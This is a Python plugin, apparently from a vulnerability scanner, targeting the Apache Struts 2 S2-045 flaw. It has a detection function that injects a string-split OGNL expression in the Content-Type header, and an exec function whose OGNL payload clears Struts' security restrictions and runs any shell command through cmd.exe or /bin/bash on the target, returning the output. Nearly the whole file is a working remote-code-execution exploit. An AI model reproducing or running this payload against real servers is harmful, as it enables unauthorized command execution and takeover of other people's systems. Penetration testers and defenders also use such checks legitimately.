#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'

import requests
requests.packages.urllib3.disable_warnings()

def get_script_info(data=None):
    script_info = {
        "name": "Struts 2-045",
        "info": "Struts 2-045.",
        "level": "high",
        "type": "info",

    }
    return script_info



def prove(data):
    data = init(data, 'web')
    if data['url'] != None:
        try:
            data['headers']["Content-Type"] = "%{#context['co'+'m.ope'+'nsympho'+'ny.xw'+'ork2.di'+'spatch'+'er.Htt'+'pServl'+'etResponse'].addHeader('header_str2045','header_str2045'+'_'+'multipart/form-data')}"
            res = requests.get(data['url'], headers=data['headers'], verify=False, timeout=data['timeout'])
            if res.headers['header_str2045'] == 'header_str2045_multipart':
                data['flag'] = 1
                data['data'].append({"headers": data['headers']})
                data['res'].append({"info": res.headers, "key": "header_str2045"})
        except:
            pass
    return data





def exec(data=None):
    data = init(data, 'web')
    if data['url'] != None:
        cmd = data['cmd'] if 'cmd' in data.keys() else  'whoami'
        data['headers']["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        try:
            import requests
            content = requests.get(data['url'], headers=data['headers'], verify=False, timeout=data['timeout']).content
            data['flag'] = 1
            data['data'].append({"headers": data['headers']})
            data['res'].append({"info": content,"key":cmd})
        except:
            pass
    return data
